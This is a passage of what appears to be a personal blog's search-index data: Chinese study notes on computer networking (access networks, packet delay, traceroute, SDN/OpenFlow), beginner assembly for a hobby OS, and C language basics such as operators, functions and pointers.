Line）因特网接入，家庭DSL调制解调器得到数字数据并转化为高频音，中心局的DSLAM接收模拟信号后转化为数字数据。 当上行和下行速率不一样时叫非对称DSL 2.电缆 从提供有线电视的公司可以获得电缆因特网接入（cabl internet access），通过光缆连接电缆头端到光纤节点，再使用同轴电缆连接到家家户户，也被称为混合光纤同轴（Hybrid Fiber Coax，HFC）。 类似于DSL modem，电缆也需要电缆调制解调器（cable modem），而电缆调制解调器终端系统（Cable Modem Termination System,CMTS）则和DSLAM的功能类似。Modem将HFC划分了上行和下行信道，下行的传输速率被通常比上行高很多。 3.FTTH 光纤到户（Fiber To The Home）又分为主动光纤网络（Active Optical Network）和被动光纤网络（Passive Optical Network）。 PON结构如下，ONT（Optical Nerwork Terminator）连接到分配器，OLT（Optical Line Terminator）可以在光信号和电信号之间转换。 FTTH有着速率高的优点（当然更贵）。 在无法提供DSL、线缆、FTTH的地方，使用卫星链路与因特网相连。 企业接入：以太网、WIFI 实际上越来越多的家庭和校园都使用了局域网技术 广域无线接入：3G、LTF 1.2.2-物理媒体1.双绞铜线 由两根隔离的铜线组成，每根大约1mm粗，以规则的螺旋形式排列，可以减少电气干扰，通常使用许多双绞线捆扎成一根电缆，覆上保护层，就是一条通信链路。而无屏蔽双绞线（Unshielded Twisted Pair）则用在建筑物内。传输速率在10Mbps与10Gbps之间 2.同轴电缆 使用两个铜导体组成同心的电缆，通常用于电视系统，速率通常在几十Mbps 3.光纤 光纤有着细而柔软的，能够引起光脉冲的身体，每个脉冲代表1bit，速率可以高达100Gbps。信号不易被干扰、衰弱，窃听难。 4.陆地无线电信道 包含电磁频谱的信号，信号能穿墙、距离远，但很依赖环境 5.卫星无线电信道 通信中常使用同步卫星和近地卫星 1.3-网络核心1.3.1-分组交换从源主机发送一个文件（报文message）时，需要将它划分成小的数据块，称为分组（packet）。该文件（报文）在传输过程中，分组（数据包）需要经过通信链路和分组交换机（packet switch） 存储-转发传输 指交换机必须接收完整个分组才能向下一条链路传输。 计算发送数据时端到端的延迟（只考虑传输延迟） 假设源与目标之间有着$N$条链路（N-1交换机），分组长度$L$(bit)，链路速率$R$(bps)，需要传输$P$个分组。 分析： 当时间处于$N(L/R)$时，第一个包到达，$N(L/R)+(L/R)$时，第二个包到达，以此类推，当处于$N(L/R)+(P-1)(L/R)$时，全部到达，所以有公式$$d_{end-end}=N*(L/R)+(P-1)(L/R)$$ 排队延迟与丢包 因为需要存储，所以分组交换机有个输出缓存（buffer），用来决定该分组该发往哪条链路。当分组交换机正在发送其他分组时，后面来的分组就必须等待，等待的这个时间就叫排队延迟（queue delay）。 这个延迟的特点就是随机性变化，主要取决于网络的拥塞程度。此外，因为缓存是有限的，还会出现丢包（packet lost） 转发表和路由选择协议 分组头部包含了目的地的IP，而每台路由器有一个转发表（forwarding table），可以将IP映射成输出链路，通常都会选择最近的路径进行传输 1.3.2-电路交换类似于通话，电路交换会先建立一条连接，在连接时预留了恒定的传输速率，所以发送方可以以恒定额速率向接收方传送数据。 为了扩大一条链路的用户，电路交换使用了频分复用FDM和时分复用TDM（原理我已经在其他笔记写明） 1.3.3-两者对比对于它们两个的区别可以通过一个例子说明 假设有多个用户共享一条1Mbps链路，每个用户要么以100kbps的恒定速率产生数据，要么不产生数据，假如只用10%的用户活跃。 采用电路交换，则该链路仅支持10(1Mbps/1kbps)个并发（同时工作）的用户 使用分组交换，活跃率0.1，假如有35个用户，有11个以上的并发用户概率是0.0004（使用了二项式与中心极限定理），当有10个并发用户时，与电路交换基本一样。当超过10个时，输出队列变长，即使支持多个用户，性能不变（但概率是极小的），这种情况和电路的性能一样。 但是如果用户低于10个，假定某一个用户（其他人休息）产生了1000个1000bit的分组，在使用电路交换时，依旧使用100kbps的速率（其他频段、时隙空闲着），需要10s；而使用分组交换，则可以使用这条链路的最大速率即1Mbps，只需要1s。 总的来说分组的优势是效率，电路的优势是稳定 1.4-分组了解分组的时延、丢包、和吞吐量 1.4.1-时延也就是数据从源出发，到达目的地的时间。时延又分为结点处理时延（nodal processing delay）、排队时延（queuing delay）、传输时延（transmission delay）、传播延迟（propagation delay）。 处理时延：路由检查分组和决定发送目标 排队时延：指在流量大时分组在路由停留的时间 传输时延：指源将分组送到链路上的时间 传播时延：指在链路上传播的时间（与距离和光速有关） 总时延：$$d_{nodal}=d_{proc}+d_{queue}+d_{trans}+d_{prop}$$ 1.4.2-排队时延和丢包值得研究的是排队时延，它与主要与流量的速率、链路的传输速率有关。 假设$a$表示分组到达速率（pkt/s），$R$是传输速率，每个分组有$L$ bit。 则有$La/R$代表路由的流量强度 &gt;1代表到达速率大于传输速率，此时排队时延将接近无穷大，因为发送慢 丢包 当排队的队伍满了（缓存满了），后面到达的分组就没有位置排队，造成分组丢失 1.4.3-端到端的时延假设端与端之间存在了n-1的路由器（n条链路），这里不考虑排队，太复杂$$d_{end-end}=N(d_{proc}+d_{trans}+d_{prop})$$Traceroute工具 可以对输入的地址发送多个分组，然后报告三次往返时间（*代表丢包） 123456789101112131415161718192021222324252627282930313233# manu @ MY in ~ [15:00:52] C:2$ traceroute yangchaohe.comtraceroute to yangchaohe.com (185.199.109.153), 30 hops max, 60 byte packets 1 TianYi.Home (192.168.1.1) 1.918 ms 2.114 ms 2.373 ms 2 100.64.0.1 (100.64.0.1) 25.693 ms 25.683 ms 26.056 ms 3 61.159.144.33 (61.159.144.33) 6.670 ms 6.654 ms 6.619 ms 4 61.159.144.65 (61.159.144.65) 14.496 ms 15.063 ms 15.043 ms 5 202.97.69.93 (202.97.69.93) 35.400 ms 35.331 ms 35.339 ms 6 202.97.94.138 (202.97.94.138) 32.900 ms 36.775 ms 36.533 ms 7 202.97.12.37 (202.97.12.37) 47.054 ms * 202.97.12.45 (202.97.12.45) 36.031 ms 8 xe-0-0-6.r27.tokyjp05.jp.bb.gin.ntt.net (129.250.66.9) 151.965 ms 151.439 ms 150.848 ms 9 ae-2.r31.tokyjp05.jp.bb.gin.ntt.net (129.250.2.155) 157.396 ms ae-1.r30.tokyjp05.jp.bb.gin.ntt.net (129.250.2.157) 151.674 ms *10 ae-3.r01.tokyjp08.jp.bb.gin.ntt.net (129.250.6.133) 152.397 ms 152.126 ms 152.090 ms11 * * *12 * * *13 * * *14 * * *15 * * *16 * * *17 * * *18 * * *19 * * *20 * * *21 * * *22 * * *23 * * *24 * * *25 * * *26 * * *27 * * *28 * * *29 * * *30 * * * 除了指令还有网站可以测试http://www.traceroute.org 1.4.4-吞吐量就是网速，有平均吞吐量和瞬时吞吐量 下面是书上深入介绍吞吐量的例子 因为$R_{s}$与$R_{c}$的速率不一样，所以吞吐量=$min{R_{c},R_{s}}$，因为因特网的带宽很大，通常只考虑接入速率 1.5-区分各层数据单位摘自百度百科：协议数据单元PDU（Protocol Data Unit）是指对等层次之间传递的数据单位。 协议数据单元(Protocol Data Unit )物理层的 PDU是数据位（bit），数据链路层的 PDU是数据帧（frame），网络层的PDU是数据包（packet），传输层的 PDU是数据段（segment），其他更高层次的PDU是报文（message）。说白了，pdu就是某协议发送数据的基本单位，各协议有各自的格式。实际使用中其实很多人其实不太分这么细，统一称作数据包。","link":"/Networking/Top-Down-Note/1.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%9B%A0%E7%89%B9%E7%BD%91.html"},{"title":"2.应用层","text":"这章主要介绍了网络的应用程序，如Web、电子邮件、DNS、P2P，还有套接字(socket) 2.2.1-网络应用程序体系结构一个应用程序也有自己的体系结构，不同于网络的结构（5层）。应用程序体系结构由开发者自己设计，可能还会利用CS（client-server）和P2P结构。 在CS结构中，有一个主机用来接收所有客户的主机的请求，如Web、FTP、Telent、电子邮件，而这个存储数据的主机如果仅是一台的话肯定是跟不上客户的请求的，所以服务端通常配备了大量的主机主机组成数据中心然后创建强大的虚拟服务器。","link":"/Networking/Top-Down-Note/2.%E5%BA%94%E7%94%A8%E5%B1%82.html"},{"title":"5.网络层-控制平面","text":"转发表和流表是联系数据平面和控制平面的重要元素, 本章主要学习如何计算, 维护, 安装转发表和流表. 5.1-控制方式 路由器控制 在路由器里的路由组件负责转发和路由功能, 每个路由组件之间可以互相通信, 然后计算转发表 逻辑集中控制 在控制器上集中计算, 分配转发表, 可以实现更多丰富的功能—负载均衡, 防火墙, NAT. 通过指定协议使控制器与路由器中的控制代理(control agent,CA)交互, CA只负责与控制器通信 SDN+逻辑集中控制被广泛使用 5.2-路由算法内容涉及高数, 暂且不做笔记 5.2.1-LS(Link-State)路由算法略 5.2.2-DV(Distance-Vector)路由算法略 5.3-自治系统(AS)内部路由选择: OSPF略 5.4-ISP之间的路由选择: BGP略 5.5-SDN控制平面满足SDN通用转发的4个关键点 转发基于流 SDN控制的交换机数据包可以基于传输层, 网络层, 链路层任意数量的标头字段值(一个流) 数据平面和控制平面的分离 数据平面由交换机组成, 控制平面由管理交换机流表的服务器和软件组成 软件控制网络 控制平面有两个组件, SDN控制器(操作系统)+网络控制应用程序, 控制器会部署在多个服务器上, 提高性能 网络可编程 应用程序可以根据SDN提供的API来控制数据平面 控制器+控制网络的应用程序 控制器的功能从下至上主要有三层 通信层 控制器和网络设备之间的通信. 规定协议来传输信息, 如OpenFlow和SNMP. 管理网络状态层 SDN控制平面必须要了解所有网络主机, 链接, 交换机和其他SDN设备的状态. 网络控制应用层 这层提供API使应用程序能从第二层中读取网络状态和流表. 然后响应设备的事件进行动作. OpenFlowOpenFlow能在实现OpenFlow API的设备之间运行, 如SDN控制器/交换机. 它通过TCP操作, 端口6653. 从SDN控制器给交换机的重要信息如下 configuration 该信息使控制器可以查询和控制交换机的配置参数 Modify-State 修改交换机中流表的条目, 还可以设置端口属性 Read-State 从交换机的流表和端口处统计信息和计数器数值 Send-Packet 使用这个消息控制器可以向交换机指定的端口发送指定的数据包. 从交换机给控制器的信息有 Flow-Removed 代表流表条目已删除, 这是由于超时接受修改流表状态信息的结果 Port-status 通知控制器端口状态的变化 Packet-in 可以将与流表条目不匹配的数据包发送给控制器处理, 匹配的数据包采取动作也可以发送给控制器. Packet-in信息可以将这些数据包发送给控制器 ICMPInternet control message protocol(ICMP)是主机和路由器互相传递网络层信息的协议. ICMP位置处于应用层协议, 在IP头的编号为1","link":"/Networking/Top-Down-Note/Control-Plane.html"},{"title":"自制OS01-汇编","text":"写系统不会汇编怎么行 汇编基础电脑里所有的东西都是二进制码 十六进制一位表示二进制四位 1byte = 8bit ;代表注释 源程序都是由十六进制完成的，十六进制前面要加0x，不然就是十进制 因为二进制就算转换位十六进制也还是太长了，所以在汇编程序里使用 指令DB(define byte，大小写无所谓)指令：写入1字节，此外，DB可以直接写字符串 DB&quot;hello world&quot; 汇编语言会自己查找字符对应的编码，然后排列 ARESB(reserve byte)指令：空出字节DW(define word)：word代表16位，也就是2字节DD(define double word) : four bytes$计算前面有多少字节（不只这一个含义） ORG(origin，起源)：告诉nask，开始执行的时候，将机器语言指令装载到内存中的哪个地址。 * 加入这条指令后，$的意思是将要读入的内存地址。 JMP(jump)：跳转，与entry结合使用 entry(入口)：标签说明，用于指定JMP指令的跳转目的地等 MOV(move)：赋值例如MOV SS,AX，AX并没有变“空”，而是保持原有值不变 IPLboot sector也叫IPL(initial program loader，启动程序加载器)：计算机是以512字节为一个单位读取的，而第一个单位就是boot sector，计算机会检查boot sector的最后两个字节，是0x55AA计算机才会认为有启动程序（就是这样设计的） 寄存器代表性的寄存器有下面8个： AX—–accumulator，累加寄存器 CX—–counter，计数寄存器 DX—–data，数据寄存器 BX—–base，基址寄存器 SP—–stack pointer，栈指针寄存器 BP—–base pointer， 基指针寄存器 SI——sourse index，源变址寄存器 DI——destination index， 目的变址寄存器 上面都是十六位的寄存器，可以存储16位的二进制数 X表示extend（扩展的意思） 这些寄存器加起来有十六个字节 32位的前面加E CPU中另外8个寄存器： AL—–accumulator low,累加寄存器低位 CL—–counter low,计数寄存器低位 DL—–data low,数据寄存器低位 BL—–base low,基址寄存器低位 AH—–accumulator high,累加寄存器高位 CH—–counter high,计数寄存器高位 DH—–data high,数据寄存器高位 BH—-base high,基址寄存器高位 AX寄存器有16位。0-7位是AL，8-15是AH，其他同理 CPU依旧是那个CPU 段寄存器ES—-extra segment,附加段寄存器 CS—-code,代码段寄存器 SS—-stack，栈段寄存器 DS—-data，数据段寄存器 FS—- GS—- 一些语句： MOV SI,msg 意思是SI = msg，把标号赋给了地址 注意，这里书上msg==0x7c74 JMP entry==JMP 0x7c50 每个标号对应一段地址，因为此时entry==0x7c50，注意entry可以自定义 MOV BYTE[678],123 表示用内存的678号地址来存123这个数值，BYTE表示8个存储单元响应，WORD表示16个单元 内存的低位在上面，高位在下面 内存地址指定还可以用寄存器，BYTE[SI] MOVE的原数据和目的数据必须位数相同，也就是说AL可以省略BYTE MOV AL,[SI] 指令 ADD加法指令 ADD SI，1 表示SI=SI+1 CMP比较指令 CMP a,3 先比较a与3，再做什么 JE条件跳转语句之一（jump if equal） 可以根据CMP的比较结果来执行下一条指令 INT(interrup)中断指令和BIOS(basic input output system) HLT（halt） 可以让CPU进入待机状态，并不是完全停止 内存 内存是外部存储器 CPU要通过管脚向内存发送电信号，严格来说。CPU和内存之间存在芯片（chipset）的控制单元 CPU访问内存的速度比访问寄存器要慢很多倍 0x00007c00是启动区装载内容地址","link":"/OS/self-made/note01.html"},{"title":"C语言基础","text":"这是我的入门语言，自己学得不是很好，也用的不多 基础12345678#include&quot;stdio.h&quot;//函数库int main ()//圆括号里为参数，main前面为类型，为main返回值类型 ，大括号是函数体 { char mychar='a'; putchar(mychar); mychar=getchar(); return 0;} 在程序里可以用{}写调试代码，定义变量不会影响外面的变量c99 你的输入和你的程序中间还有一个shell 标识符 由字母和下划线，数字组成，但数字不能开头 且不能用C关键字 区分大小写，长度不限 变量变量定义格式为：类型 变量名=value； 每结束一个变量必须以；结尾 变量说明必须放在函数开头部分 通过=赋值； 常量宏定义:#define 常量名 数据 函数内定义:const 类型 类型名; 说明：const只有c99才支持 整型数据整型常量也叫常数，常见的有十进制，八进制（前缀0），16进制（前缀0x） 整型变量可以使用int创建一个存储整数的空间 所占字节数要看寄存器的大小， 有范围 类型有int，short，long，unsigned，区分有符号的和无符号的 通过，可同时编译多个变量 sizeof()可以知道某变量所占字节大小； sizeof()是静态运算符，他的结果在编译时就决定了，不能在（）里做运算。 整形存储的二进制 十进制的正整数在内部就是他的二进制 而负数则采用补码的形式： -a，补码2n-a，n为类型的位数 优点：方便计算，而不用判断正负 1111 1111用纯二进制代表255，补码代表-1 https://blog.csdn.net/qq_41739364/article/details/100125337 设计unsigned的初衷是为了移位 16进制的一个位==2进制的4个位 8进制的一个位==2进制的3个位 实型数据（浮点型）实型常量 也叫实数或者浮点数 在c中，实数只采用十进制，有0-9和小数点组成 指数形式需要加e或E以及阶码组成如2.6e-5 实型变量 分为两类，单精度float(占4字节)，双精度double(占8字节)； float输入格式：%f输出：%f定义格式float a = 1.0f 如果不带f则是double double输入：%lf输出：%f %lf 浮点数的精度1.无法比较2.永远不精确； 通常使用double 字符型数据字符常量 由单引号括起的字符，'a'； 不能用双引号 常量只能是单个字符，区分字符串 可以是字符集中任意字符，但'1'和1不一样 占用一个字节，实质为ASCⅡ码，所以可以像整数那样去计算 字符变量（逃逸字符） 转义字符变量 是一种特殊的变量，不同于字符原有的意义，所以称转义 如\\n代表换行 特别是所有ASCⅡ码（0-255）都可以用\\ddd(1-3位的八进制)和\\xhh(1-2位的十六进制)表示 字符变量 类型说明符为char（占1byte） 因为只有一个字节，所以只能存放一个字符（ASCⅡ） C语言允许把整型值（2/4/8）赋给字符变量，字符变量赋给整型值，因为整型值字节多，转为字符值时按低8位处理 字符串常量 由双引号括起的字符序列，“china” 可以含一个或多个字符 不能把字符串常量赋给字符变量 通常以\\0结尾，系统自动加上，所占字节为所有字节数+1 C语言会自动把两个“”“”的内容连接起来 C没有字符串变量，要用字符数组来存放字符串变量 基本输入与输出因为C本身没有输入输出语句，这是由C函数库提供的，函数库有大量具有独立功能的函数程序块，printf和scanf存储在stdio.h头文件中，使用时要在源程序中加上#include 输出printf（格式控制，输出序列） 格式控制为双引号括着的字符串，包含格式说明%和普通字符；int %dlong %ldfloat %fdouble %lfchar %c 输出序列则是若干的数据变量，也可以是表达式 printf(“%3.2f”,)数据占3位（超过不限制），向右对齐，左边补空格，小数点可以有2位，-3表示向左对齐 字符输出putchar 只处理一个字符 输入scanf（格式控制，地址表列） 赋值给地址表列（以&amp;开头） &amp;右边必须是明确的变量 字符输入getchar 只处理一个字符 格式化的输入输出 printf % [flags][width][.prec][hIL]type Flag 含义 width 或 prec 含义 hIL（类型修饰） 含义 - 左对齐 number 最小字符数 hh 单个字节 + 在前面放+或- * 下一个参数是字符数 h short (space) 正数留空 .number 小数点后面的位数 l long 0 0填充 .* 下一个参数是小数点后面的位数 ll long long L long double type 用于 type 用于 i 或 d int g float u unsigned int G float o 八进制 a 或 A 十六进制浮点 x 十六进制 c char X 字母大写的十六进制 s 字符串 f 或 F float,6 p 指针 e 或 E 指数 n 读入/写出的个数 scanf %[flag]typpe flag 含义 flag 含义 * 跳过 l long,double 数字 最大字符数 ll long long hh char L long doble h short type 用于 type 用于 d int a,e,f,g float i 整数，可能是8进制或16进制 c char u unsigned int s 字符串 o 八进制 […] 所允许的字符 x 十六进制 p 指针 printf &amp;scanf是由返回值的 读入的项目数 输出的字符数 赋值运算运算法则 ()→-→%*/→+- 复合赋值 类型最好为double 表示简化赋值操作的代码例如x=x+10表示为x+=10 +=告诉编译程序：x被赋值为x+10 同*=/=;-=;%= 根式sqrt() 指针运算pow(2,4)表示2的4次方;可以用来表示多次根式; exp(3)表示e的三次方 对数log() 自增和自减(只适用于变量)x=x+1可写成x++或者++x 当是一个单独的程序语句时,符号在前面后面都没关系;but下面的情况特殊 y=x++表示现将x的值给y，x再加1 y=++x表示x先加1再赋给y ++--优先级最高吧 x++表示的值是x的值,运算表示x=x+1 ++x表示的值是x+1的值,运算表示x=x+1 关系运算关系运算有两种结果，是1否0 &lt; &lt; &lt;= =1.这四组优先级相同 2.比下两个优先级高 == 比较等于 = 不等于 关系运算符的优先级低于算数运算符 但他高于赋值运算符 有括号还是算括号 逻辑运算符结果同样只有0和1||或&amp;&amp;与!非1.优先级从上到下逐渐升2.但||&amp;&amp;低于关系运算符,高于赋值运算符!；高于算数运算符;实测比增减量符低 计算同物理电路 逻辑表达式对比是否非0值 重要!!! 1234567#include&lt;stdio.h&gt;main(){ int a=1,b=2,c=3,d=4,m=2,n=2; (m=a&gt;b)&amp;&amp;(n=c&gt;d);//m=0,因为是与运算,所以后面不看了,n=2 printf(&quot;%d&quot;,n); system(&quot;pause&quot;);} 逗号运算符及逗号表达式 可以连接多个表达式 表达式1,表达式2 从左到右依次计算 优先级最低 以右边的表达式作为结果 1234567891011#include &lt;stdio.h&gt;int main () {int i;i = 3, 4;printf(&quot;%d\\n&quot;, i);} 运行结果是3 1234567891011#include &lt;stdio.h&gt;int main () {int i;i = (3, 4);printf(&quot;%d\\n&quot;, i);} 运行结果是4 注意：调用函数时圆括号的逗号是标点符号 条件运算符和条件关系式 是C语言唯一的三目运算符(需要3个数据和表达式构成的条件表达式) 一般形式 表达式1 ? 表达式2 : 表达式3 意为如果表达式1成立,则为表达式2的值,否则是表达式3的值 结合方向从右向左 自动类型转换机制和强制类型转换 自动在运算中若有多个类型则计算机会自动转化为范围最宽的,但如果有float会自动转化为double 强制格式(类型)表达式 1.优先级和+--相同,因为它是单目运算符(只有一个变量的运算符) 2.对于printf，任何小于int的类型都会转换成int，float会转换成double 3.但scanf不会 产生随机数列用到srand,rand函数在#include &lt;stdlib&gt;函数库里使用rand创建种子,rand根据种子产生随机数; 12srand(time(0));rand()1000//产生1000以内的随机数; 选择结构程序设计表达式里只要=0出现就会退出循环体!!!emmm表达式使用 &lt;= 会给自己贴标签 顺序结构选择结构12345//if-else结构格式:if(表达式) { }else { } 退化形式无else直接结束 可以嵌套使用,else配对原则:与之前最近的if配对;包含多个语句分支时,用{}括起语句不容易出错多分支结构 1234567if() { }else if() { }.....else { } switch实现多分支结构 1234567switch(表达式){ case 常量表达式1:语句块1;break; case..... default:语句块;} 若没有break,则一直执行到default 个人理解if-else和switch条件分支语句 当输入的范围广时用if-else,反之都行 循环结构当型循环表达式在循环体上面,不满足条件会直接跳出循环; 1234while(表达式){ 循环体;} 直到型循环;表达式在循环体下面,不满足条件也会先执行一次循环体 12345do{ 循环体;}while(表达式); for循环1234for(表达式1,表达式2,表达式3){ 循环体;} 表达式2没有默认是1 运行步骤: 先运行表达式1,然后对表达式2求解,为真则进入循环体,再执行表达式3,退回上一步; 表达式可以缺失,但;不能少. break continuebreak出现在循环体中会直接跳出循环 continue则会回到原来的循环体 针对内层循环 离开多重循环1.接力break: 内层循环定义一个变量exit == 1 外面每层循环加上if ( exit ==1 ) break 2.goto out out: 会直接跳到out:之后的地方 表达式里只要=0出现就会退出循环体!!! 循环结构的选择: 1.固定次数用for 2.无论如何都要运行一次用do while 3.其他用while ​","link":"/Programming/C/C.html"},{"title":"按位运算与移位运算","text":"按位与移位的学习只是要知道底层是怎么工作的，日常很少用到 按位运算 按位与&amp;: 1&amp;1=1, 其他都是0 应用:让某一位或某些位位0: x &amp; 0xFE 取一个数的某一段: x &amp; 0xFF 按位或 | ; 1 | 0=1, 1 | 1=1, 0 | 0=0 应用:使某位为1; 拼数:0xFF00 | 0x00FF 按位取反~:1-&gt;0, 0-&gt;1 得到全部为1的数: ~0 7的二进制为0111, x | 7使低3位为1; x &amp; ~7, 则使低3位为0 按位异或^: 相同为0, 不同为1; x^y ^y ==&gt; x x=y ,x^y=0 移位运算左移：i &lt;&lt; j i 中所有的为向左移动 j 个位置，右边填0； 所有小于int 的类型，移位以int的方式来做，结果是int x &lt;&lt;= 1 等价 x *= 2 x &lt;&lt;= n 等价 x *= 2^n 右移：i &lt;&lt; j i 中所有的为向右移动 j 个位置， 所有小于int 的类型，移位以int的方式来做，结果是int 对与unsigned的类型，左边填入0 而signed的类型，左边填入原来的最高位 x &lt;&lt;= 1 等价 x /= 2 x &lt;&lt;= n 等价 x /= 2^n 移位不能用负数","link":"/Programming/C/%E6%8C%89%E4%BD%8D%E4%B8%8E%E7%A7%BB%E4%BD%8D.html"},{"title":"简单理解函数","text":"c对类型的检查并不严谨emmm形参实参我哭了。。。tm直接叫参数不好吗 没指针的函数只有参数值的传递，不能改变原有参数的值 =左边是左值，因为是运算 C语言通过调用函数来实现功能 分类库函数由C语言提供，使用时只需要程序前包含函数的头文件即可 用户定义函数用户自己定义函数，要在函数中定义函数本身， 在主函数调用中还必须对被调函数进行类型说明，才能使用. 有返回值的函数此类函数调用后向调用者返回一个执行结果，必须定义类型. 无返回值函数并非真的没有，只是只关心处理过程而已，无返回值时可定义返回类型为空(void)，或者不写 无参函数函数定义、说明、调用均不带参数，主调函数和被调函数之间不进行函数传送，一般这类函数用于完成指定功能，可以返回（return）或者不返回函数值. 有参函数函数定义和说明中有参数. 说明: 规定了传输数据的类型和数量 定义时不给他分配空，只有在使用时才临时给他分配，结束即释放 参数可以是变量，表达式，常量，函数等，在使用时必须有确定的值 与使用的参数在数量，类型，顺序上必须保持一致 返回指针的函数 返回本地变量的地址是危险的 返回全局变量和静态变量的地址是安全的(虽然安全，但不推荐使用，或者尽量避免使用来传递参数) 返回在函数内的malloc是安全的，但容易造成问题 最好的做法就是返回传入的指针 使用全局变量和静态本地变量的函数是线程不安全的 函数注意事项c语言中所有函数都是平行的，即在一个函数体内不能定义另一个函数 但允许函数之间相互调用，嵌套调用 但main不允许被其他函数地调用，且c语言只允许有一个main 函数的定义函数类型 函数名(参数及其类型){ 函数变量说明; 语句;} ⑴不关心类型可定义为void ⑵命名要满足标识符 ⑶定义时参数必须有类型，看情况要不要参数 ⑷可以没有参数，但括号不能省（与变量区分） 函数声明 旧标准放在主函数里面，新标准可以放在主函数外面 函数类型 函数名([参数表]); 说明: ①声明时，可以不写参数，但类型必须写. ②#include也是调用函数，使用&lt;&gt;时，指定系统会首先查找C编译的头文件路径，使用&quot;&quot;时，会首先查找当前目录. ③定义是创造，声明是引用. ④int型和char在定义时可不写类型，系统默认int型 ⑤当定义在主调函数前面时可不声明，当返回值为int和char时，也可不声明 函数调用一般形式： 函数名(参数表) 无参函数没有参数表, 各参之间用逗号隔开 引用的参数和定义的参数必须一一匹配 允许自己调用自己，叫递归调用. 函数调用只能返回值 变量类型和作用域printf(&quot;%s&quot;,_func_);可以得到所在函数名 局部变量 也叫内部变量，只作用与内部，也就是定义的地方内，在复合语句定义的变量，只在他的范围内有效. 参也属于局部变量 不同的函数可以使用相同的变量，他们互不干扰 只有被调用时才会被分配储存单元，用完就释放 全局变量 也叫外部变量，在函数外部定义的变量，作用于整个源程序，但只有经过声明(extern)才能使用，在函数之前定义的变量可以不用声明. 有效范围从定义位置到文件结束 若全局变量和局部变量同名，在局部变量的作用域里，全局变量失效. 定义在外部，与任何函数无关 任何函数都可以使用它 初始化 全局变量默认是0 指针默认NULL 只能用编译时刻已知的值来初始化全局变量 初始化发生在main之前 变量的储存方式 全局和局部是由变量的定义域来划分的 若从变量存在的时间长短来划分，可分为动态储存变量和静态储存变量，也就是说，变量的生存期取 于变量的储存方式. 动态auto自动变量❶未加储存类型说明的默认auto ❷属于局部变量，作用域仅限于变量个体内(因此不同函数使用相同的变量不会混淆) ❸属于动态储存方式，只有被调用时才会被分配储存单元，调用结束即释放，结束后，自动变量的值不会被保留. ❹默认数据不定 register寄存器变量❶采用寄存器型存储(存在CPU的寄存器内)的变量，叫寄存器变量，可以提高访问效率 ❷其他类变量都是放在内存储器内，需要反复访问内存储器，效率不高 静态extern 外部变量❶也叫全局变量 ❷定义，在声明之后编译系统不会为他分配内存空间 static静态变量❶相对于自动变量的生存期，静态局部变量始终存在，生存期为整个源程序. ❷作用域和自动变量一样，退出后，尽管变量依旧存在，但不能使用他，再次调用可继续使用，而且保留了上次使用后的值 ❸默认0 静态全局变量 只在这个.c文件里有效 即在外部变量前加static，区别就是静态的限制了作用域，静态的在各个源文件都是有效的，静态只在定义的源 文件内有效，可以避免在其他源文件中引起错误. 因此，变量说明的完整形式为 储存类型说明符 数据类型说明符 变量名; 特殊的地方就是有着全局的生存期，是函数内部的作用域 本地变量的一些规则： 是定义在块内的（一对大括号） 函数进入块之前，其中的变量不存在，离开后消失 块里的函数名与外面的变量同名会掩盖外面的 静态变量其实就是特殊的全局变量 他们位于相同的内存区域 特殊的地方就是有着全局的生存期，是函数内部的作用域 1234567891011121314#include &lt;stdio.h&gt;int c;int main(int argc, char const *argv[]){ int a=0; static int b=0; printf(&quot;&amp;c=%p\\n&quot;, &amp;c); printf(&quot;&amp;a=%p\\n&quot;, &amp;a); printf(&quot;&amp;b=%p\\n&quot;, &amp;b); return 0;} 可以看到全局变量和静态变量的地址差4(int) main里面的参数12int main(int argc, char const *argv[]){} 这些参数值是从操作系统的命令行中得到 argc 整数 argv 字符串 argv[0]是你执行的名字 argv[1]是你后面输入的指令 可以用来搞快捷方式","link":"/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E5%87%BD%E6%95%B0.html"},{"title":"简单理解指针","text":"*与&amp;相互作用：*&amp;a实际上就是a变量 是C语言的优势，指针也就是地址 定义格式类型 *指针变量名;或类型* 指针变量名; 说明 指针变量的类型是他指向内存单元中存放的数据类型 指针变量必须被赋值语句赋值初始化后才能使用，否则，严重的话会死机 可初始化为0，NULL(不指向任何值)或者某个地址 指针变量只能接受地址,赋以数据会错误 引用 在指针引用前，要定义，赋值，否则，会造成系统混乱 指针运算符取址符&amp; 单目运算符,结合性自左向右. 取内容符* 也叫间接引用运算符,结合性自左向右,且*后面只能是指针. 指针的值也可以改变,也就是改变指向. 指针的类型 不同类型的指针不能相互赋值（虽然没问题） 123int* a = NULL；char* b = NULL；a = b； 如果*a=0，则*b[0]-*b[3]都会变成0 指针类型的转换 void* 表示不知道指向什么东西的指针： int *p = &amp;i; void*q = (void*)p; 并没有改变p所指的变量类型，而是用不同的眼光通过p去看它所指的变量 q此时认为p指向的变量不是int，而是void 场景1利用函数交换数值（也就是说传给主函数多个数值） 1234567891011121314151617181920212223#include &lt;stdio.h&gt;void swap(int *pa, int *);int main() { int a, b; a = 1; b = 2; swap(&amp;a, &amp;b); printf(&quot;a=%d, b=%d&quot;, a, b); return 0;}void swap(int *pa, int *pb){ int t; printf(&quot;pa=%p,pb=%p\\n&quot;, pa, pb); printf(&quot;*pa=%d,*pb=%d\\n&quot;, *pa, *pb); t = *pa; *pa = *pb; *pb = t; printf(&quot;pa=%p,pb=%p\\n&quot;, pa, pb); printf(&quot;*pa=%d,*pb=%d\\n&quot;, *pa, *pb);} 场景21.函数返回运算状态，指针返回结果 2.当要返回的值多个都是有效的结果时，要分开返回了 *p和p *p是常量，p是变量 指针与数组注意：函数参数表的数组其实就是指针 以下四种函数原型是等价的 int sum(int *a, int b) int sum(int*, int) int sum(int a[], int b) int sum(int [], int) 数组就是特殊的指针 []对指针和数组都可以用，同理*也一样 因为int a[]&lt;==&gt;int *const a= 所以这里不能被赋值 如a = b;//error 一维数组指针123int a[10];int *p;*p = &amp;a[0] 在C语言中规定数组名代表数组中的首地址(声明函数的参数不是,他不占实际内存单元) 实际上p=&amp;a[0]与p=a一样 但是数组的单元表达的是变量，需要&amp;取地址 意思是把数组的首地址赋给p p+1实际是p+1*d，d代表字节数 综上，引用数组元素的方法有 下标法:a[0]或p[0]; 指针法:*(a+i)或者*(p+i); a是数组的首地址，即指针常量 因为数组元素也是内存变量，所以此类指针的定义和使用和指向变量的指针变量相同. 12int a[10] *p;p = a; 此时p指向a[0]，下面可以用p表示数组元素. 下标表示: 